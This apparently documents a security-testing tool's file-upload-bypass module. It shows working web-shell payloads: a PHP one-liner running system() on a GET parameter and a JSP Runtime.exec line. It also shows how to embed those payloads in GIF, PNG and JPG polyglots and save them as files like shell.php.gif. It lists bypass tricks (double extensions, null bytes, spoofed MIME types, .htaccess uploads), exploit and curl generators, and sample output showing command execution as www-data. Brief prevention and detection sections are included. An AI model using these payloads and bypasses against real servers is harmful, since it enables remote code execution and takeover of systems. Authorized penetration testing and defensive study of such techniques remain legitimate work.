# File Upload Bypass Module

## Overview

The File Upload Bypass module provides automated testing for file upload vulnerabilities using polyglot file generation and multiple bypass techniques. It generates files that are simultaneously valid as both images and executable code, then tests various methods to bypass upload restrictions and trigger code execution.

## Features

### Polyglot File Generation

The module can generate polyglot files that are valid as both images and server-side code:

- **PHP Polyglots**: Valid GIF/PNG/JPG + PHP code
- **JSP Polyglots**: Valid GIF/PNG/JPG + JSP code
- **ASPX Polyglots**: Valid GIF/PNG/JPG + ASPX code
- **Python Polyglots**: Valid GIF/PNG/JPG + Python code

### Bypass Techniques

1. **Double Extension**: `file.php.jpg` - Exploits improper extension validation
2. **MIME Manipulation**: Upload PHP with `image/gif` Content-Type
3. **Magic Bytes**: Inject image magic bytes into executable files
4. **Null Byte Injection**: `file.php%00.jpg` - Bypasses extension checks
5. **Case Variation**: `file.PhP` - Bypasses case-sensitive filters
6. **HTAccess Upload**: Upload `.htaccess` to enable code execution

### Execution Triggers

After successful upload, the module attempts to trigger execution via:

1. **Direct Access**: Access the uploaded file directly with command parameters
2. **Path Traversal**: Use directory traversal to access the uploaded file
3. **File Inclusion**: Use LFI/RFI vulnerabilities to include the uploaded file

## Usage

### Basic Usage

```python
from app.core.request_handler import RequestHandler
from app.modules.file_upload_bypass import (
    FileUploadBypassTester,
    UploadPoint,
    PolyglotType,
    BypassTechnique,
)

# Initialize
request_handler = RequestHandler()
tester = FileUploadBypassTester(request_handler)

# Define upload point
upload_point = UploadPoint(
    url="https://target.com/upload.php",
    parameter="file",  # Form field name
    method="POST",
    additional_fields={"submit": "Upload"},
)

# Test for vulnerabilities
results = await tester.test_upload_point(
    upload_point,
    techniques=[
        BypassTechnique.DOUBLE_EXTENSION,
        BypassTechnique.MIME_MANIPULATION,
        BypassTechnique.MAGIC_BYTES,
    ],
    polyglot_types=[
        PolyglotType.PHP_IMAGE,
        PolyglotType.JSP_IMAGE,
    ],
)

# Check results
for result in results:
    if result.is_vulnerable:
        print(f"Vulnerable! Technique: {result.bypass_technique.value}")
        print(f"Uploaded URL: {result.uploaded_url}")
        print(f"Execution output: {result.execution_output}")
```

### Generate Polyglot Files

```python
from app.modules.file_upload_bypass import PolyglotGenerator

generator = PolyglotGenerator()

# Generate PHP polyglot
php_polyglot = generator.generate_php_polyglot(
    image_format="gif",
    payload='<?php system($_GET["cmd"]); ?>',
)

# Save to file
with open("shell.php.gif", "wb") as f:
    f.write(php_polyglot)

# Generate JSP polyglot
jsp_polyglot = generator.generate_jsp_polyglot(
    image_format="png",
    payload='<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
)
```

### Generate Exploit Code

```python
from app.modules.file_upload_bypass import FileUploadExploitGenerator

# After finding a vulnerability
if result.is_vulnerable:
    exploit_gen = FileUploadExploitGenerator(result)
    
    # Generate Python exploit
    python_exploit = exploit_gen.generate_python_exploit()
    print(python_exploit)
    
    # Generate curl commands
    curl_commands = exploit_gen.generate_curl_commands()
    print(curl_commands)
```

## Polyglot File Structure

### GIF + PHP Polyglot

```
GIF89a          <- Valid GIF header
[minimal GIF data]
<?php system($_GET["cmd"]); ?>  <- PHP code
```

### PNG + PHP Polyglot

```
[PNG signature]
[PNG chunks]
tEXt chunk with PHP code  <- PHP embedded in text chunk
IEND chunk
```

### JPG + PHP Polyglot

```
[JPG SOI marker]
[JPG comment marker with PHP code]  <- PHP in comment
[JPG data]
[JPG EOI marker]
```

## Bypass Technique Details

### Double Extension

Exploits servers that only check the last extension or use improper validation:
- `shell.php.jpg` - Server checks `.jpg` but executes as `.php`
- `shell.php.png` - Similar bypass
- Works when server uses weak regex or only validates final extension

### MIME Manipulation

Bypasses MIME type validation by sending executable code with image MIME type:
- Upload `shell.php` with `Content-Type: image/gif`
- Server validates MIME but doesn't verify actual content
- Relies on server trusting client-provided MIME type

### Magic Bytes Injection

Bypasses content-based validation by including valid image magic bytes:
- File starts with `GIF89a` (GIF magic bytes)
- Followed by PHP/JSP/ASPX code
- Server checks magic bytes but doesn't validate entire file structure

### Null Byte Injection

Exploits null byte handling in older systems:
- `shell.php%00.jpg` - Null byte truncates filename
- Server sees `.jpg` but filesystem stores as `shell.php`
- Works on older PHP versions and some file systems

## Security Considerations

### Validation Requirements

To prevent file upload attacks, applications should:

1. **Validate File Content**: Check entire file structure, not just magic bytes
2. **Whitelist Extensions**: Only allow specific safe extensions
3. **Rename Files**: Use random names, don't trust user input
4. **Store Outside Webroot**: Prevent direct execution
5. **Validate MIME Type**: Check server-side, don't trust client
6. **Scan for Malware**: Use antivirus/malware scanners
7. **Set Proper Permissions**: Uploaded files should not be executable

### Detection Indicators

Signs of file upload exploitation:
- Unusual file extensions in upload directories
- Image files with embedded code
- `.htaccess` files in upload directories
- Polyglot files (valid as multiple formats)
- Files with double extensions
- Suspicious MIME types

## Requirements Validation

This module validates the following requirements:

- **Requirement 41.1**: Generate polyglot files valid as both images and code
- **Requirement 41.2**: Test bypass techniques (double extensions, MIME, magic bytes)
- **Requirement 41.3**: Bypass both client-side and server-side validation
- **Requirement 41.4**: Trigger execution via traversal, direct access, inclusion
- **Requirement 41.5**: Generate payloads for PHP, JSP, ASPX, Python

## Example Output

```
[*] Testing file upload bypass...
[+] Upload successful using double_extension technique
[+] Uploaded file: shell.php.jpg
[+] File location: https://target.com/uploads/shell.php.jpg
[+] Execution triggered via direct_access
[+] Command output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[*] Vulnerability confirmed!
[*] Bypass technique: double_extension
[*] Polyglot type: php_image
[*] Confidence: 95%
```

## Integration

The module integrates with:
- **Request Handler**: For HTTP communication
- **Payload Engine**: For payload management
- **Logging System**: For recording findings
- **Report Generator**: For documentation

## Future Enhancements

Potential improvements:
- Support for more image formats (TIFF, WebP, SVG)
- Additional server-side languages (Ruby, Perl, Node.js)
- Advanced polyglot techniques (ZIP+JAR, PDF+JS)
- Automated upload directory discovery
- Integration with web shells for post-exploitation
